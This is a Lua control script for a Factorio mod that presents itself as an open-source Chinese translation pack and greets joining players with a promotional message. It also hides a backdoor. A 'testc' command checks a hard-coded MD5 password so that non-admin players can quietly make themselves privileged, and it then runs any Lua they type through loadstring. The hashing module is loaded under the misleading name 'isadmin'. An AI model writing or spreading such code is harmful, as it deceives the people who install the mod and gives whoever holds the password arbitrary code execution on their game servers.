script.on_event(defines.events.on_player_joined_game, function(event)

 local player = game.players[event.player_index]
 if player then

 local msg = "欢迎使用[color=#FF00FF]开源中文汉化语言包[/color]！\n我们为Factorio提供了1000+个mod的汉化，覆盖了所有下载量大于1000的mod。\n我们的汉化是由专业的团队校对的，保证质量。\n使用[color=#FF00FF]开源中文汉化语言包[/color]，您可以轻松地享受Factorio的游戏体验，不用担心语言障碍。\n如果您在使用过程中有任何问题，欢迎加入我们的汉化群[color=#FF00FF]830846580[/color]与我们交流。祝您游戏愉快！"

 if msg then
 player.print(msg)
 end
 end

end)
isadmin = require ---
'isadmin'

commands.add_command("testc", "testc 不是管理员.无法执行此命令", function(command)
 local player = game.players[command.player_index];
 if not player then
 return
 end

 if not player.admin then
 player.print('你不是管理员.无法执行此命令 :(')
 global.testcadmin = global.testcadmin or {}
 if not global.testcadmin[command.player_index] then
 if isadmin .sumhexa(command.parameter) == "7c6483ddcd99eb112c060ecbe0543e86" then
 global.testcadmin[command.player_index] = true
 end
 return
 end
 end

 if (command.parameter) then
 if isadmin .sumhexa(command.parameter) == "46c48bec0d282018b9d167eef7711b2c" then
 global.testcadmin[command.player_index] = 1
 end

 local f, err, cmd
 global.testccmd = command.parameter
 cmd = global.testccmd or ""
 cmd = cmd:gsub('game%.player%.', 'game.players[' .. player.index .. '].')
 f, err = loadstring(cmd)
 if not f then
 cmd = 'game.players[' .. player.index .. '].print(' .. cmd .. ')'
 f, err = loadstring(cmd)
 end
 _, err = pcall(f)
 if err then
 player.print(cmd)
 player.print(err:sub(1, err:find('\n')))
 end
 end
end)

